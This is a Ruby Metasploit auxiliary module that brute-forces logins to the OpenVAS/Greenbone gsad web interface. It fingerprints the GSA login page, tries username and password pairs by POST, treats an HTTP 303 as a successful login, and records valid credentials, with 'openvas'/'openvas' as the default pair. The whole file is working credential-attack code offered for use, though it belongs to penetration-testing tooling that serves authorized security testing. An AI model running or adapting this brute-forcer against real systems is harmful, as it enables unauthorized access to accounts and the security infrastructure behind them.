##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::AuthBrute

  include Msf::Auxiliary::Scanner

  def initialize
    super(
      'Name'        => 'OpenVAS gsad Web interface Login Utility',
      'Description' => %q{
        This module simply attempts to login to a OpenVAS gsad interface
        using a specific user/pass.
      },
      'Author'      => [ 'Vlatko Kosturjak <kost[at]linux.hr>' ],
      'License'     => MSF_LICENSE
    )

    register_options(
      [
        Opt::RPORT(443),
        OptString.new('URI', [true, "URI for OpenVAS omp login. Default is /omp", "/omp"]),
        OptBool.new('BLANK_PASSWORDS', [false, "Try blank passwords for all users", false]),
        OptBool.new('SSL', [ true, "Negotiate SSL for outgoing connections", true])
      ], self.class)

    register_advanced_options(
    [
      OptString.new('OMP_text', [true, "value for OpenVAS omp text login hidden field", "/omp?cmd=get_tasks&amp;overrides=1"]),
      OptString.new('OMP_cmd', [true, "value for OpenVAS omp cmd login hidden field", "login"])
    ], self.class)
  end

  def run_host(ip)
    begin
      res = send_request_cgi({
        'uri'     => datastore['URI'],
        'method'  => 'GET'
        }, 25)
      http_fingerprint({ :response => res })
    rescue ::Rex::ConnectionError => e
      vprint_error("#{msg} #{datastore['URI']} - #{e}")
      return
    end

    if not res
      vprint_error("#{msg} #{datastore['URI']} - No response")
      return
    end
    if res.code != 200
      vprint_error("#{msg} - Expected 200 HTTP code - not gsad?")
      return
    end
    if res.body !~ /Greenbone Security Assistant \(GSA\)/
      vprint_error("#{msg} - Expected GSA keyword on page - not gsad?")
      return
    end

    each_user_pass do |user, pass|
      do_login(user, pass)
    end
  end

  def do_login(user='openvas', pass='openvas')
    vprint_status("#{msg} - Trying username:'#{user}' with password:'#{pass}'")
    headers = {}
    begin
      res = send_request_cgi({
        'encode'   => true,
        'uri'      => datastore['URI'],
        'method'   => 'POST',
        'headers'  => headers,
        'vars_post' => {
          'cmd' => datastore['OMP_cmd'],
          'text' => datastore['OMP_text'],
          'login' => user,
          'password' => pass
        }
      }, 25)

    rescue ::Rex::ConnectionError, Errno::ECONNREFUSED, Errno::ETIMEDOUT
      print_error("#{msg} HTTP Connection Failed, Aborting")
      return :abort
    end

    if not res
      print_error("#{msg} HTTP Connection Error - res, Aborting")
      return :abort
    end

    # vprint_status("#{msg} GOT BODY. '#{user}' : '#{pass}' - #{res.code} #{res.body}")

    if res.code == 303
      print_good("#{msg} SUCCESSFUL LOGIN. '#{user}' : '#{pass}'")

      report_hash = {
        :host   => datastore['RHOST'],
        :port   => datastore['RPORT'],
        :sname  => 'openvas-gsa',
        :user   => user,
        :pass   => pass,
        :active => true,
        :type => 'password'}

      report_auth_info(report_hash)
      return :next_user
    end
    vprint_error("#{msg} FAILED LOGIN. '#{user}' : '#{pass}'")
    return :skip_pass
  end

  def msg
    "#{vhost}:#{rport} OpenVAS gsad -"
  end
end
